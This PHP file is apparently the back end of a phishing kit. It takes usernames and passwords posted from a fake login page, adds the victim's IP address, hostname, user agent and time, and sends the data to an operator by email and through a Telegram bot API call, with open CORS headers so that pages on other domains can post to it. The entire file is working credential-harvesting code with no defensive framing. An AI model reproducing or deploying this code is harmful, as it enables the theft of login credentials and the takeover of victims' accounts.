<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true ");
header("Access-Control-Allow-Methods: OPTIONS, GET, POST");
header("Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control");
header("Content-Type: text/plain"); // Prevent file download

include 'email.php';
include 'telegram.php';

function sendTelegramMessage($botToken, $chatId, $text) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    return file_get_contents($url, false, $context);
}

$im = trim($_POST['ai'] ?? '');
$password = trim($_POST['pr'] ?? '');
$pv = trim($_POST['page_value'] ?? '');

if(!empty($im) && !empty($password) && !empty($pv)) {
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip) ?: 'Unknown';
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    
    // Get current URL and additional info
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https://" : "http://";
    $url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    $timezone = date_default_timezone_get();
    $local_time = date('Y-m-d H:i:s');

    // Plain text message for email
    $message = "|----------| LOGIN ATTEMPT |--------------|\n";
    $message .= "Username: $im\n";
    $message .= "Password: $password\n";
    $message .= "Page: $pv\n";
    $message .= "|--------------- SYSTEM INFORMATION --------------|\n";
    $message .= "IP Address: $ip\n";
    $message .= "Hostname: $hostname\n";
    //$message .= "URL: $url\n";
    $message .= "User Agent: $useragent\n";
    $message .= "Timezone: $timezone\n";
    $message .= "Local Time: $local_time\n";
    $message .= "IP Location: http://www.geoiptool.com/?IP=$ip\n";
    $message .= "|-----------------------------------------------|";

    // Send email
    $subject = "Login : $ip";
    mail($Receive_email, $subject, $message);
    
    // Enhanced HTML formatted message for Telegram
    $telegramMsg = "<b>📝 LOGIN ATTEMPT</b>\n\n";
    $telegramMsg .= "👤 <b>Username:</b> " . htmlspecialchars($im) . "\n";
    $telegramMsg .= "🔑 <b>Password:</b> " . htmlspecialchars($password) . "\n";
    $telegramMsg .= "🌐 <b>Page:</b> " . htmlspecialchars($pv) . "\n\n";
    $telegramMsg .= "<b>🖥️ SYSTEM INFORMATION</b>\n";
    $telegramMsg .= "📡 <b>IP Address:</b> $ip\n";
    $telegramMsg .= "🏠 <b>Hostname:</b> $hostname\n";
   // $telegramMsg .= "🔗 <b>URL:</b> $url\n";
    $telegramMsg .= "🌍 <b>User Agent:</b> " . htmlspecialchars($useragent) . "\n";
    $telegramMsg .= "⏰ <b>Timezone:</b> $timezone\n";
    $telegramMsg .= "🕒 <b>Local Time:</b> $local_time\n\n";
    $telegramMsg .= "📍 <a href='http://www.geoiptool.com/?IP=$ip'>View IP Location</a>";

    // Send Telegram message
    $telegramResult = sendTelegramMessage($botToken, $id, $telegramMsg);
    
    if ($telegramResult) {
        die("OK");
    }
}

die("Missing credentials");
?>